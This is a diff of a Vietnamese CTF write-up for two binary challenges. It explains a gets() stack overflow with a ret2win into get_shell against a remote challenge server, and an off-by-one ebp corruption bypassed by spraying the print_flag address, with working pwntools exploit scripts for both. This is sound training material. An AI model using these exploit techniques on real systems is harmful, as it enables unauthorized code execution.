@@ -40,7 +40,9 @@ p.interactive()
  </details>
 
 # babyFlow
-
+<details>
+<summary> babyflow </summary>
+ 
   ta thấy hàm gets có thể đoán được nó có BOF
   ![image](https://user-images.githubusercontent.com/111769169/219847378-e4e3ddf8-5d26-4c29-8942-f3b0ddbb0e23.png)
   ___
@@ -48,7 +50,36 @@ p.interactive()
   ![image](https://user-images.githubusercontent.com/111769169/219847745-1b1e755a-971c-4086-9ec8-1886b295ecc9.png)
   bây giờ ta tìm offset để ret2win là 24  
   ![image](https://user-images.githubusercontent.com/111769169/219847816-83e0ff9c-1b99-4f52-9f4a-9be9adb00317.png)
-  
 ```python3
+from pwn import *
 
+exe = ELF("./babyFlow", checksec = False)
+#p = process("./babyFlow")
+
+p = remote("143.198.219.171", 5000)
+
+input()
+payload = b'a' * 24 + p32(exe.sym['get_shell'])
+p.sendlineafter(b' me?\n', payload)
+p.interactive()
 ```
+</details>
+
+# passme
+<details>
+ <summary> passme </summary>
+  ban đầu ta nghĩ nó sẽ so sánh 17.022023 với chuỗi ta nhập vào  
+  tuy nhiên 17.022023 là long double còn trong file 32bit thì chỉ là float  
+  đến đây em được hint là lỗi off-by-one offset là 68 và 1 byte null do hàm gets để lại nên địa chỉ ebp bị thay đổi và nhảy lung tung (giống dạng $rbp)  
+  do là nhảy lung tung, có thể nhảy vào giữ payload nên ta có thể để payload toàn là ret về print_flag để tăng cơ hội nhảy vào print_flag  
+ ```python3
+ from pwn import *
+exe = ELF("./passme", checksec = False)
+
+p = process(exe.path)
+payload = p32(exe.sym['print_flag']) *  17
+p.sendafter(b'name: \n', payload)
+
+p.interactive()
+ ```
+</detail>
